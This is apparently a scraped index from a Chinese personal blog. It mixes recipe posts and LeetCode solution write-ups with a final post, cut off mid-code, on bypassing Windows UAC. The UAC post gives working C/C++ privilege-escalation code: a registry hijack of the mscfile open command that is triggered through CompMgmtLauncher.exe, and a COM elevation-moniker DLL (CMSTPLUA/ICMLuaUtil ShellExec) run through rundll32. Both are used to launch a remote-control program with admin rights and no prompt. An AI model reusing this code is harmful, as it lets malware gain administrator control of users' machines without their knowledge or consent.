放鸭肉，此时的油应该能够没过肉。油炸数分钟使鸭肉表面呈现深棕色，然后将鸭肉取出。 Step1 Step1.1 2. 加胡萝卜\n将刚才的油取出少许，使得剩余的油没过锅底即可； 放入蒜炒香，放入胡萝卜。 Step2 3. 加丝瓜\n将丝瓜倒入锅中，看似很多，之后炒制将会缩水。 Step3 4. 焖制\n加入适量水之后盖上锅盖焖制，其间适时开盖翻炒。 整个过程大约数分钟。 5. 加调味料，加鸭肉\n加入盐、糖、味精，翻炒均匀； Step4 加入之前炸制的鸭肉。翻炒均匀。 Step5 6. 出锅\n鸭肉本柴，裹粉油炸使得口感得到较好的改善；丝瓜无味，正适合解油除腻。 Final1 Final2 ","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E4%B8%9D%E7%93%9C%E7%82%92%E9%B8%AD%E8%82%89/","title":"食记 | 丝瓜炒鸭肉"},{"content":"开启了新的分类——日常篇。\n从知识分享到知识记录，最终此博客大概要变成无所不包的地方罢。\n本文忠实地记录一道家常菜的做法：荷兰豆炒腊肠（名字我乱起的）。这道菜为荷兰豆附上了腊肠的香气，且不失其青翠本色，是我个人接受度较高的一种荷兰豆的做法。\n食材\n荷兰豆若干，大蒜少许，胡萝卜若干（点缀颜色），瘦肉若干，腊肠切片，火腿肠切片（可选）。\n食材 制作流程\n1. 热油，放蒜炒香\n这一步大概是家常菜中的起手式了。由于荷兰豆并不是特别吸油，加上腊肠本身在炒制的过程中会出油，这一步的油量放到盖过锅底即可。翻炒数下，香味顿起，不食蒜者可将蒜捡出。 Step1 2. 加胡萝卜\n个人觉得胡萝卜在这道菜中的作用就是点缀一点颜色，放或不放皆可。胡萝卜早放则出锅之后口感较为柔软，晚放则生脆，自行斟酌。 Step2 3. 加腊肠和瘦肉\n油香立变。 Step3 4. 加荷兰豆和火腿肠\n初加荷兰豆时，其表面暗淡；翻炒数下即青翠欲滴。可以在此步加入火腿肠，以此法做出的火腿肠别具风味。 Step4 Step5 5. 盖上锅盖焖制，加调味料\n盖上锅盖焖制数分钟，其间适时开盖翻炒，使油和菜混匀；适量加水以免出现焦味；数分钟后，加调味料（盐、味精、糖、酱油），翻炒均匀，可再焖制数十秒，随后出锅。 此步无图。 6. 成品\n此法做出的荷兰豆光泽明亮，入口有腊肠香味，细嚼则有清香，并不肥腻。 Final ","date":"2021-01-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E8%8D%B7%E5%85%B0%E8%B1%86%E7%82%92%E8%85%8A%E8%82%A0/","title":"食记 | 荷兰豆炒腊肠"},{"content":"题目链接：https://leetcode-cn.com/problems/check-if-it-is-a-straight-line/\n题目 在一个 XY 坐标系中有一些点，我们用数组 coordinates 来分别记录它们的坐标，其中 coordinates[i] = [x, y] 表示横坐标为 x、纵坐标为 y 的点。\n请你来判断，这些点是否在该坐标系中属于同一条直线上，是则返回 true，否则请返回 false。\n分析 这种题目居然WA了一次。。。\n依题意，判断给出的所有点是否都在同一直线上，我们只需要按照前两点的坐标计算斜率和截距，得到由前两点确定的直线方程，将后面的坐标套入此方程即可。\n这题的特殊情况有两种：\n一共只给出两个点。两点确定一条直线，直接返回true。 所有点垂直于x轴。这样的直线没有斜率，需要单独拎出来讨论（第一次提交就挂在这里了）。 直接放代码了。\nclass Solution { public: bool checkStraightLine(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; coordinates) { // ax1 + b = y1; ax2 + b = y2 // a(x1 - x2) = y1 - y2 // a = (y1 - y2) / (x1 - x2) // b = y1 - ax1 if (coordinates.size() == 2) return true; bool vertical = false; // 垂直，无斜率 float a = 0, b = 0; if (coordinates[0][0] == coordinates[1][0]) vertical = true; else { a = (float)(coordinates[0][1] - coordinates[1][1]) / (coordinates[0][0] - coordinates[1][0]); b = coordinates[0][1] - a * coordinates[0][0]; } if (vertical) { for (int i = 2; i \u0026lt; coordinates.size(); ++i) if (coordinates[i][0] != coordinates[0][0]) return false; } else { for (int i = 2; i \u0026lt; coordinates.size(); ++i) { if (a * coordinates[i][0] + b != coordinates[i][1]) return false; } } return true; } }; ","date":"2021-01-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1232.-%E7%BC%80%E7%82%B9%E6%88%90%E7%BA%BF/","title":"错题本 | LeetCode1232. 缀点成线"},{"content":"题目链接：https://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/\n题目 n 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。\n如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。\n给你一个长度为 n 的数组 stones ，其中 stones[i] = [xi, yi] 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。\n示例1\n输入： stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]] 输出： 5 解释： 一种移除 5 块石头的方法如下所示： 移除石头 [2,2] ，因为它和 [2,1] 同行。 移除石头 [2,1] ，因为它和 [0,1] 同列。 移除石头 [1,2] ，因为它和 [1,0] 同行。 移除石头 [1,0] ，因为它和 [0,0] 同列。 移除石头 [0,1] ，因为它和 [0,0] 同行。 石头 [0,0] 不能移除，因为它没有与另一块石头同行/列。 分析 其实不知道这题该算错题还是难题，毕竟它的思路是简单的，但是我并没有想到。\n暂且归为错题罢。借由此题捡回了并查集的相关知识，在实现并查集的过程中有一些细节上的错误导致了一次WA，本篇将加以记录。\n分析：\n由题意可知，在同一行或同一列上的石头属于同一个集合。显然，这样的集合永远可以找到一个删除的顺序，使得集合中只剩下唯一一个石头。\n于是题目转化为了以行列为依据的并查集问题。对于一块石头idx，其坐标为(x, y)，如果x行上已经有了先来的石头root_x[x]，那么将idx加入先前就存在的root_x[x]的并查集中；否则表示idx是这一行最先到达的石头，其后的所有石头都要加入idx的并查集中。对于y列来说同理。\n于是实现并查集如下：\nint parent[1010]; // 并查集 // memset(parent, -1, sizeof(parent)); // 或者 // for (i = 0; i \u0026lt; 1010; i++) parent[i] = i; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // 路径压缩 return parent[idx]; } 我们遍历所有石头，谁先到达某一行，之后这一行上的石头都要作为它的子节点；谁先到达某一列，之后这一列上的石头都要作为它的子节点。\n这一轮遍历之后，所有同行同列的石头都处于同一个并查集中；而全局中并查集的个数就是剩余的石头个数。\nclass Solution { public: int parent[1010]; // 并查集 int root_x[10010]; int root_y[10010]; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // 路径压缩 return parent[idx]; } int removeStones(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; stones) { int idx, x, y; memset(parent, -1, sizeof(parent)); memset(root_x, -1, sizeof(root_x)); memset(root_y, -1, sizeof(root_y)); for (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } int cnt = 0; for (idx = 0; idx \u0026lt; stones.size(); ++idx) { if (find(idx) == idx) { ++cnt; cout \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } } return stones.size() - cnt; } }; 错误记录\n并查集中的join函数，原本的写法为：\nvoid join(int parent_idx, int son_idx) { parent[son_idx] = parent_idx; } 这样的写法是错误的，且非常之离谱。我们知道，两个属于不同并查集的元素的合并意味着两个并查集的合并，显然不能单纯地修改这两个元素本身，而要考虑到这两个并查集的根节点。\n就本题来说，这样的写法无法通过这个测试样例：\n[[0,1],[1,0],[1,1]] 对于最后一块石头(1, 1)，第1行已经有了石头1，第1列已经有了石头0。按照遍历过程的逻辑：\nfor (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } 最后一块石头最终将加入0号并查集。且此时剩余独立的并查集有0和1。\n然而，最后一块石头实际上是0和1的交汇点。按照正确的流程，它根据x坐标首先加入1号并查集后，再加入0号并查集，这时就会将1号石头也带入0号并查集，这也是本题使用并查集思路的正确性所在。\n正确的办法是在合并时考虑根节点的修改，详见前文代码。\n此外，本题使用的并查集还可以进行优化，包括针对本题的封装（参考[1]），和针对并查集这一结构本身的按秩合并和路径压缩（参考[2]）。\n本题还有基于图论的解法，不在本篇讨论范围内。\n参考资料\n[1] 小宇.简单思路+优化（超100%）[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/jian-dan-jie-fa-chao-100-by-mantoufan-k3ne/\n[2] yex.【详解】并查集[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/tu-jie-bing-cha-ji-by-yexiso-nbcz/\n","date":"2021-01-15T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode947.-%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/","title":"错题本 | LeetCode947. 移除最多的同行或同列石头"},{"content":"题目链接：https://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/\n这题的思路真是弯弯绕绕，看了很多份题解，最后还是我BUPT学长的一通模拟让我悟道了[1]。\n分析：\n题目要求返回数组A的最短的非空连续子数组的长度，该子数组的和至少为K。\n最开始想到的是暴力。假设数组长度为n，我们分别求出长度为1、2、\u0026hellip;、n的子数组的最大和，将他们按顺序和K比较，第一个比K大的长度就是答案。这样的做法时间复杂度是O(n2)，有点复杂。\n之后就没有想法了。跟泓泓挣扎了半天，还是只能去看题解。\n不得不说，官方题解真是不讲人话[2]，不到40行代码的思路，硬是能被说成鬼都看不懂的样子。\n首先，为了方便求任意一段连续子数组的和，我们需要使用前缀和数组prefix_sum。在这个题目中，prefix_sum[i]表示的是从A[0]到A[i - 1]的前缀和，注意是A[i - 1]，作用后面会讲。总之，求前缀和的办法是很常规的。\n我们知道，求得了前缀和数组之后，对于两个下标x、y（设y\u0026gt;x），prefix_sum[y] - prefix_sum[x]表示的就是从A[x + 1]到A[y]这段子数组的和。那么，问题就转化为了针对prefix_sum数组，求一对x和y，满足prefix_sum[y] - prefix_sum[x] \u0026gt;= K，且y - x最小。\n朴素的思想是遍历每一对y和x，这样的复杂度还是O(n2)，显然需要用某种更巧妙的办法让我们摆脱两重循环。\n于是引出官方题解中的第一条性质：\n对于prefix_sum数组，假设有下标**a \u0026gt; b**，且prefix_sum[a] \u0026lt;= prefix_sum[b]，那么对于它们后面的某个下标y来说，只需要考虑a ~ y这一段是否满足条件，而不再需要考虑b ~ y这一段了。这是因为，prefix_sum[y] - prefix_sum[a] \u0026gt;= prefix_sum[y] - prefix_sum[b]，而且y - a \u0026lt; y - b，如果b ~ y这一段能满足条件，那么a ~ y这一段也一定能满足条件，而且这段子数组的长度更小。 如果我没有讲清楚，不妨看看参考[1]中的模拟大法：\n本条性质的模拟 我们使用一个双端队列deque来利用这个性质。让下标从前往后走，保持deque中保存的下标x0、x1、\u0026hellip;始终满足prefix_sum[x0] \u0026lt; prefix_sum[x1] \u0026lt; ...；注意，由于下标是从前往后走的，当出现了某个prefix_sum[x_m] \u0026lt; prefix_sum[deque.back()]的时候，说明对于之后的下标y来说，x_m是更为合适的选择，也因此可以直接将队尾的元素剔除。\n使用下面的代码来进行实现，注意deque的初始元素0。\n// deque\u0026lt;int\u0026gt; monoq;\t// 变量名与官方题解保持一致 monoq.push_back(0); // 放入一个0 for (i = 1; i \u0026lt;= A.size(); ++i) // 下标从前往后走 { while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); // 当前这个i满足性质一，使得后续的y只需要考虑下标i } ... } 实现了性质一，需要引出性质二：\n对于一个固定的下标x来说，第一次遇见某个y满足prefix_sum[y] - prefix_sum[x] \u0026gt;= K之后，其后更大的下标y_bigger就不必再考虑x了。这很合乎直觉，因为我们要求的是最小的y - x。 我们的下标从前往后走的时候，当前下标既是x，也是y。更确切地说，设当前下标为i，它向前需要看能否满足prefix_sum[i] - prefix_sum[x] \u0026gt;= K；向后需要考虑自己作为区间起点的情况，也就是作为一个x，淘汰掉队列中现有的满足性质一的那些元素。\n上面的代码已经成功利用了性质一，现在只需要再从队首去找满足性质二的元素即可：\nfor (i = 1; i \u0026lt;= A.size(); ++i) { /* 性质一、当前下标作为区间起点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* 性质二、当前下标作为区间终点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* 当前下标放入队列中，作为区间起点 */ monoq.push_back(i); } AC代码：\nclass Solution { public: int shortestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int prefix_sum[50010]; // 前缀和数组 deque\u0026lt;int\u0026gt; monoq; // 单调队列 int i; // 循环变量 int ans = A.size() + 1; // 最终答案，初始值大于数组长度，是个违法数值 /* 循环一遍求得前缀和 */ prefix_sum[0] = 0; // !IMPORTANT for (i = 1; i \u0026lt;= A.size(); ++i) // prefix_sum[i]为A[0]到A[i - 1]的前缀和 { prefix_sum[i] = prefix_sum[i - 1] + A[i - 1]; } /* 再循环一遍求得最短子数组的长度 */ monoq.push_back(0); // 放入一个0 for (i = 1; i \u0026lt;= A.size(); ++i) { /* 性质一、当前下标作为区间起点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* 性质二、当前下标作为区间终点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* 当前下标放入队列中，作为区间起点 */ monoq.push_back(i); } return ans == A.size() + 1 ? -1 : ans; } }; 一些细节\n在之前的分析中我们提到过，在这个题目中，prefix_sum[i]表示的是从A[0]到A[i - 1]的前缀和。这里的前缀和数组的表示方法主要是为了满足区间长度为A.size()时的情况。我们的monoq需要有个初始元素0，这使得prefix_sum[0]也受到考虑。当答案区间长度为A.size()的时候，如样例3：\n输入：A = [2,-1,2], K = 3 输出：3 如果没有一个prefix_sum[monoq.front()] == 0，前缀和prefix_sum[3]会直接减掉prefix_sum[1]，造成输出为-1。\n参考文章\n[1] 王琛.Leetcode 862 Shortest Subarray with Sum at Least K[EB/OL].2018-07-02\nhttps://buptwc.github.io/2018/07/02/Leetcode-862-Shortest-Subarray-with-Sum-at-Least-K/\n[2] LeetCode.和至少为 K 的最短子数组[EB/OL].2019-08-13\nhttps://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/solution/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu-by-leetcod/\n","date":"2021-01-13T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode862.-%E5%92%8C%E8%87%B3%E5%B0%91%E4%B8%BA-k-%E7%9A%84%E6%9C%80%E7%9F%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode862. 和至少为 K 的最短子数组"},{"content":"题目链接：https://leetcode-cn.com/problems/verifying-an-alien-dictionary/\n题目分析：由题目给定字符的大小等级，依照此等级比较字符串大小。\n解题思路：定义一个数组order_rank[26]，给定某个字符c, order_rank['a' - c]表示该字符在order中的位置。\n错误记录：程序第32行，原本写作：while (words1[idx] == words2[idx])，这样的写法无法满足两个字符串相等的情况（即两个字符串每个字符都相等，包括最后的\\0符号也相等，产生了溢出，理论上循环将在字符串后的某个位置上停止。\n更正：循环中判断两个字符的终止，改为while (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != '\\0' \u0026amp;\u0026amp; words2[idx] != '\\0')。\nAC代码：\nclass Solution { public: int order_rank[26]; bool isAlienSorted(vector\u0026lt;string\u0026gt;\u0026amp; words, string order) { vector\u0026lt;string\u0026gt;::iterator ite; bool ret = true; set_rank(order); // 设置order_rank数组 for (ite = words.begin(); ite != words.end(); ++ite) // 两两对比 { if (ite != words.end() - 1) { if (cmp(*ite, *(ite + 1)) \u0026gt; 0) // cmp返回正数，前者比后者大 { ret = false; break; } } } return ret; } void set_rank(string order) { int idx = 0; for (idx = 0; idx \u0026lt; 26; ++idx) { order_rank[order[idx] - \u0026#39;a\u0026#39;] = idx; // 得到每个字母的顺序，rank越小，出现越早，等级越低 } } int cmp(string words1, string words2) { int idx = 0; while (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != \u0026#39;\\0\u0026#39; \u0026amp;\u0026amp; words2[idx] != \u0026#39;\\0\u0026#39;) { ++idx; } // 循环结束，word1[idx] != words2[idx] // 分三种情况 if (words1[idx] == \u0026#39;\\0\u0026#39;) // words1到达末尾 { if (words2[idx] == \u0026#39;\\0\u0026#39;) return 0; else return -1; // word1 \u0026lt; words2 } else if (words2[idx] == \u0026#39;\\0\u0026#39;) // words2 到达末尾 { return 1; // word1 \u0026gt; words2 } else // 出现不相等，比较两者字符的rank，越低的越小 return order_rank[words1[idx] - \u0026#39;a\u0026#39;] - order_rank[words2[idx] - \u0026#39;a\u0026#39;]; // words1[idx]的rank更小，返回负数 } }; ","date":"2021-01-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode953.-%E9%AA%8C%E8%AF%81%E5%A4%96%E6%98%9F%E8%AF%AD%E8%AF%8D%E5%85%B8/","title":"错题本 | LeetCode953. 验证外星语词典"},{"content":"最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。\n话不多说，总结本次的提权办法——绕过UAC。\n1 UAC UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。\n然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。\n当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。\n如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。\n不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。\n2 绕过UAC 根据参考文章［１］所述，\t触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：\n该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。 对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。\n2.1 基于白名单的Bypass　UAC 有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。\n针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。\n我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：\n#include \u0026lt;Windows.h\u0026gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项 ::RegCreateKeyEx(HKEY_CURRENT_USER, \u0026#34;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command\u0026#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, \u0026amp;hKey, NULL); // 设置键值 ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // 关闭注册表 ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位 ::Wow64DisableWow64FsRedirection(\u0026amp;OldValue); // 修改注册表，设置我们的程序为启动目标 bRet = SetReg(\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); // 运行 CompMgmtLauncher.exe system(\u0026#34;CompMgmtLauncher.exe\u0026#34;); printf(\u0026#34;Run OK!\\n\u0026#34;); // 恢复文件重定位 ::Wow64RevertWow64FsRedirection(OldValue); return 0; } 然而，修改注册表的提权方式过于简陋，会被WinDefender拦截下来。\n被识别的行为 运行的结果也就不放了。程序会直接被杀死（Defender甚至把我的目标exe给删了）。\n2.2 基于COM组件接口的Bypass　UAC 我对于COM的理解实际上不够清晰和深入，有兴趣的可以去看看参考文章[1~3]。\n从我的理解来看，COM（Component Object Model，组件对象模型）是一种更加严格的面向对象编程规范，遵守这一规范的二进制程序需要提供标准的接口来供其他程序调用。这种程序以“组件”的方式存在，可以被复用，故节省了内存；而且，由于这些组件独立存在，对它们本身做出的改动不会影响使用者的程序结构，方便了它们的功能升级。\nCOM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序，以提升权限的方法来激活COM类，最终提升COM接口权限。简单地说，就是主调程序以COM的规范实例化一个具有管理员权限的组件，这样这个组件的功能函数就能运行在管理员权限下。此外，COM规定了一个ICMLuaUtil接口，其下有一个ShellExcute方法，能够启动任意的程序。\n文章[1]还指出，如果执行COM提升名称代码的程序身份是不可信的，则会触发UAC弹窗；若可信，则不会触发UAC弹窗。所以，要想Bypass UAC，则需要想办法让这段代码在Windows的可信程序中运行。其中，可信程序有计算器、记事本、资源管理器、rundll32.exe等。\n我们仅仅希望以管理员权限启动我们的远控程序，则直接制作一个DLL交给rundll32.exe运行即可。按照上面的思路，我们的DLL应该先实例化一个管理员权限的COM组件，这个提权后的组件调用ShellExcute来启动远控程序。\nDLL项目的代码如下：\n// File: CBypassUAC.h #pragma once #ifndef BYPASS_UAC_H #define BYPASS_UAC_H #include \u0026#34;windows.h\u0026#34; #include \u0026lt;objbase.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #define CLSID_CMSTPLUA L\u0026#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u0026#34; #define IID_ICMLuaUtil L\u0026#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}\u0026#34; typedef interface ICMLuaUtil ICMLuaUtil; typedef struct ICMLuaUtilVtbl { BEGIN_INTERFACE HRESULT(STDMETHODCALLTYPE* QueryInterface)( __RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_ void** ppvObject); ULONG(STDMETHODCALLTYPE* AddRef)( __RPC__in ICMLuaUtil* This); ULONG(STDMETHODCALLTYPE* Release)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method1)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method2)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method3)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method4)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method5)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method6)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* ShellExec)( __RPC__in ICMLuaUtil* This, _In_ LPCWSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow ); HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)( __RPC__in ICMLuaUtil* This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey, _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString ); HRESULT(STDMETHODCALLTYPE* Method9)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method10)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method11)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method12)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method13)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method14)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method15)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method16)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method17)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method18)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method19)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method20)( __RPC__in ICMLuaUtil* This); END_INTERFACE } *PICMLuaUtilVtbl; interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; }; extern \u0026#34;C\u0026#34; __declspec(dllexport) void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow); HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid); BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable); #endif // File: CBypassUAC.c #include \u0026#34;pch.h\u0026#34; #include \u0026#34;CBypassUAC.h\u0026#34; // COM提升名称，以管理员权限实例化一个组件 HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid) { BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // 初始化COM环境 ::CoInitialize(NULL); // 构造字符串 ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L\u0026#34;Elevation:Administrator!new:%s\u0026#34;, wszCLSID); if (FAILED(hr)) { return hr; } // 设置BIND_OPTS3 ::RtlZeroMemory(\u0026amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // 创建名称对象并获取COM对象 hr = ::CoGetObject(wszMonikerName, \u0026amp;bo, riid, ppVoid); return hr; } BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable) { HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, \u0026amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, \u0026amp;iidICMLuaUtil); // 提权 hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(\u0026amp;CMLuaUtil)); if (FAILED(hr)) { break; } // 启动程序 hr = CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // 释放 if (CMLuaUtil) { CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;Release(CMLuaUtil); } return bRet; } void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow) { CMLuaUtilBypassUAC((LPWSTR)L\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); } 这里需要注意，我们要在头文件中将目标函数BypassUAC导出，否则rundll32.exe程序无法正确获取这个函数。具体方法就是在函数声明时加上extern \u0026quot;C\u0026quot; __declspec(dllexport)前缀。\n对于DLL项目中的dllmain.cpp文件，保持默认即可。编译此程序，生成一个DLL。现在我们还需要编写一个程序用来调用rundll32.exe，使其执行链接库中的BypassUAC函数。\n新建一个Launcher项目，只有一个源文件：\n// File: Launcher.cpp #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; int main() { //调用rundll32.exe去执行RemoteThreadDll.dll的导出函数 达到BypassUAC char szCmdLine[MAX_PATH] = { 0 }; char szRundll32Path[MAX_PATH] = \u0026#34;C:\\\\Windows\\\\System32\\\\rundll32.exe\u0026#34;; //获取当前程序所在路径 char pszFileName[MAX_PATH] = { 0 }; GetModuleFileNameA(NULL, pszFileName, MAX_PATH); 